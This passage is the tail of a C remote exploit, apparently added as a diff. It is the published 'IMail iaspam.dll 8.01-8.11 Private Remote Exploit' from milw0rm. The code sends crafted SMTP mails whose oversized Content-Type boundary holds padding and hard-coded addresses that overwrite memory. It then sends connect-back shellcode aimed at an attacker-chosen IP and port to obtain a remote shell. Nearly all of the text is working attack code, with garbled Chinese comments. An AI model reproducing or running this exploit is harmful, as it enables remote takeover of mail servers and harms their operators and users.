+		// send payload  ¹¹ÔìÒç³öµÄ×Ö·ûŽ®  eipÖžÏòshellcodeµÄµØÖ·
+        memset(payload, 0x00, sizeof(payload));
+		memset(payload, 0x44, 520);
+		memcpy(payload+520, SCaddr, strlen((const char *)SCaddr));
+		memcpy(payload+520+4, "\r\n", 2);
+
+		Sleep(200);
+		send(s, (const char *)payload, strlen((const char *)payload), 0);
+
+		memset(payload, 0x00, sizeof(payload));
+		
+	}
+	else if (the_mail == 2)      // ·¢ËÍshellcode
+	{
+		/*
+           my $padding = "\x22"."B"x2028;
+           my $padding1 = "B"x2046;
+           my $padding11 = "B"x146;   #163žöB
+           my $straddr1 = "\x50\xd0\xfd\x7f"."\x30\xd0\xfd\x7f";     # ÔÚtebÖÐ
+           my $straddr2 = "\x50\xe7\x03\x10";     # shellcode»á¿œ±ŽµœµÄµØÖ·
+
+           print $sock "Content-Type: multipart\/boundary=$padding $padding1 $padding11$straddr1$straddr2\r\n";
+        */
+		memcpy(payload, szCT, strlen((const char *)szCT));
+		//memcpy(payload+strlen(const char *szCT), "\"", 1);
+		memset(padding, 0x43, 5000);
+		padding[0] = '\x22';   
+		padding[2029] = '\x20';
+		padding[4076] = '\x20';
+
+		//straddr1
+		padding[4223] = '\x50';
+		padding[4224] = '\xd0';
+		padding[4225] = '\xfd';
+		padding[4226] = '\x7f';
+		padding[4227] = '\x30';
+		padding[4228] = '\xd0';
+		padding[4229] = '\xfd';
+		padding[4230] = '\x7f';
+
+		//straddr2   0x7ffdc850
+		padding[4231] = '\x50';
+		padding[4232] = '\xc8';
+		padding[4233] = '\xfd';
+		padding[4234] = '\x7f';
+
+		padding[4235] = '\x0d';
+		padding[4236] = '\x0a';
+		padding[4237] = '\x00';
+
+		
+		memcpy(payload+strlen((const char *)szCT), padding, strlen((const char *)padding));
+		send(s, (const char *)payload, strlen((const char *)payload), 0);
+
+		// MIME
+     	send(s, (const char *)szMIME, strlen((const char *)szMIME), 0);
+   //	recv(s, buffer, sizeof(buffer), 0);
+  //	printf("%s", buffer);
+   //     printf("[+]Fucking Server at %s.\n", szTIME);
+   // 	memset(buffer, 0, sizeof(buffer));
+		
+		//print $sock "Content-Transfer-Encoding:$padding2\r\n";
+		memset(padding, 0x43, 80);
+		//memcpy(padding, "\x43", 80);
+		padding[80] = '\x00';
+
+		memset(payload, 0x00, sizeof(payload));
+		memcpy(payload, szCTE, strlen((const char*)szCTE));
+        memcpy(payload+strlen((const char*)szCTE), padding, strlen((const char*)padding));
+        memcpy(payload+strlen((const char*)szCTE)+strlen((const char*)padding), "\r\n", 2);
+
+		send(s, (const char *)payload, strlen((const char *)payload), 0);
+		Sleep(200);
+
+		// ·¢ËÍshellcode¹ýÈ¥±£Žæ
+        memset(payload, 0x00, sizeof(payload));
+		memcpy(payload, sh_Buff, strlen((const char*)sh_Buff));
+		memcpy(payload+strlen((const char*)sh_Buff), "\r\n", 2);
+		
+		send(s, (const char *)payload, strlen((const char *)payload), 0);
+
+		memset(payload, 0x00, sizeof(payload));
+		
+
+
+	} 
+	else	   //  µÚÈý·âÓÊŒþ£¬¹¹ÔìÒç³ö
+	{
+		Sleep(500);  // ÒòÎªÒªŽ¥·¢Â©¶ŽÁË£¬ËùÒÔ±ØÐëÒªÍíµã£¬²»È»shellcodeÃ»µœÎ»
+		/*
+           my $padding = "\x22"."B"x2028;
+           my $padding1 = "B"x2046;
+           my $padding11 = "B"x146;   #163žöB
+           my $straddr1 = "\x50\xd0\xfd\x7f"."\x30\xd0\xfd\x7f";     # ÔÚtebÖÐ
+           my $straddr2 = "\x6c\x54\x03\x10";     # shellcode»á¿œ±ŽµœµÄµØÖ·
+
+           print $sock "Content-Type: multipart\/boundary=$padding $padding1 $padding11$straddr1$straddr2\r\n";
+        */
+		memcpy(payload, szCT, strlen((const char *)szCT));
+		//memcpy(payload+strlen(const char *szCT), "\"", 1);
+		memset(padding, 0x43, 5000);
+		padding[0] = '\x22';   
+		padding[2029] = '\x20';
+		padding[4076] = '\x20';
+
+		//straddr1
+		padding[4223] = '\x50';
+		padding[4224] = '\xd0';
+		padding[4225] = '\xfd';
+		padding[4226] = '\x7f';
+		padding[4227] = '\x30';
+		padding[4228] = '\xd0';
+		padding[4229] = '\xfd';
+		padding[4230] = '\x7f';
+
+		//straddr2  Ž¥·¢Òç³öµÄµØÖ·
+		padding[4231] = '\x6c';
+		padding[4232] = '\x54';
+		padding[4233] = '\x03';
+		padding[4234] = '\x10';
+
+		padding[4235] = '\x0d';
+		padding[4236] = '\x0a';
+		padding[4237] = '\x00';
+
+		
+		memcpy(payload+strlen((const char *)szCT), padding, strlen((const char *)padding));
+		send(s, (const char *)payload, strlen((const char *)payload), 0);
+
+		// MIME
+     	send(s, (const char *)szMIME, strlen((const char *)szMIME), 0);
+   //	recv(s, buffer, sizeof(buffer), 0);
+  //	printf("%s", buffer);
+   //     printf("[+]Fucking Server at %s.\n", szTIME);
+   // 	memset(buffer, 0, sizeof(buffer));
+		
+		//print $sock "Content-Transfer-Encoding:$padding2\r\n";
+		memset(padding, 0x43, 80);
+		//memcpy(padding, "\x43", 80);
+		padding[80] = '\x00';
+
+		memset(payload, 0x00, sizeof(payload));
+		memcpy(payload, szCTE, strlen((const char*)szCTE));
+        memcpy(payload+strlen((const char*)szCTE), padding, strlen((const char*)padding));
+        memcpy(payload+strlen((const char*)szCTE)+strlen((const char*)padding), "\r\n", 2);
+
+		send(s, (const char *)payload, strlen((const char *)payload), 0);
+		Sleep(200);
+
+		// send payload  ÐÞžÄÖžÕëµØÖ·£¬¹¹Ôì³öÒç³ö
+        memset(payload, 0x00, sizeof(payload));
+		// ÐèÒªÖžÏò¹¹ÔìÒç³ö×Ö·ûŽ®µÄµØÖ·£¬ÒÔŒ°2žö¿ÉÐŽµØÖ·
+		memcpy(payload, "\x50\xc0\xfd\x7f", 4);
+		memcpy(payload+4, "\x40\xc0\xfd\x7f\x30\xc0\xfd\x7f", 8);
+		memcpy(payload+12, "\r\n", 2);
+		
+		send(s, (const char *)payload, strlen((const char *)payload), 0);
+
+		memset(payload, 0x00, sizeof(payload));
+
+	}
+
+
+	// END
+	Sleep(500);
+	send(s, szEND, strlen(szEND), 0);
+	recv(s, buffer, sizeof(buffer), 0);
+	if(strstr(buffer, "250"))
+	  printf("[+]Recv: %s", buffer);
+	else
+		{
+			printf("[-]Seems Service Down~ :( \n");
+			Disconnect(s);
+			return -1;
+		}
+	memset(buffer, 0, sizeof(buffer));
+
+
+
+	// QUIT
+	send(s, szQUIT, strlen(szQUIT), 0);
+	recv(s, buffer, sizeof(buffer), 0);
+//	printf("%s", buffer);
+    printf("[+]Fucking END, Ejaculating Now !\n\n");
+	memset(buffer, 0, sizeof(buffer));
+
+	
+	Sleep(400);
+
+    closesocket(s);
+
+	WSACleanup();
+
+	return 0;
+
+}
+
+
+
+
+int main(int argc, char *argv[])
+{
+
+	
+	//int  imail_ver = 0;    //imail version  (buffer²»Í¬)
+	//int  ret;
+
+	//SOCKET  s;
+	//WSADATA WSAData;
+
+	printf("\n== IMail iaspam.dll 8.01-8.11 Private Remote Exploit\n");
+	printf("== by axis@ph4nt0m\n");
+	printf("== http://www.ph4nt0m.org\n");
+	printf("== 2007-06\n");
+	printf("== 2007-09-18 published as a gift for the 6th Anniversary of Ph4nt0m\n");
+	printf("== ConnBack Version\n");
+	printf("== Thanks EnvyMask@ph4nt0m\n\n");
+
+
+	if(argc != 5)
+	{
+		help(argv[0]);
+		return 0;
+	}
+
+	if(argc == 5) port = atoi(argv[4]);
+
+
+	GetShellCode(argv[3], port);
+	if (!sh_Len)
+	{
+		printf("[-] Shellcode generate error.\n");
+		exit(1);
+	}
+
+
+	//printf("shellcode length is: %d \n",strlen((char *)sh_Buff));
+	//PrintSc(sh_Buff, sh_Len);
+
+
+	Sleep(200);
+
+	for (int mail_payload = 0; mail_payload <= 3; mail_payload++)
+	{
+		//printf("[+]Now Sending the %d fucking Mail!\n",mail_payload+1);
+		sendfuckingmail(mail_payload, argv[1], atoi(argv[2]));
+		Sleep(2000);
+	}
+	
+	printf("Got a Shell on your port ?! @_@\n\n");
+
+
+	return 1;
+
+}
+
+// milw0rm.com [2007-09-21]
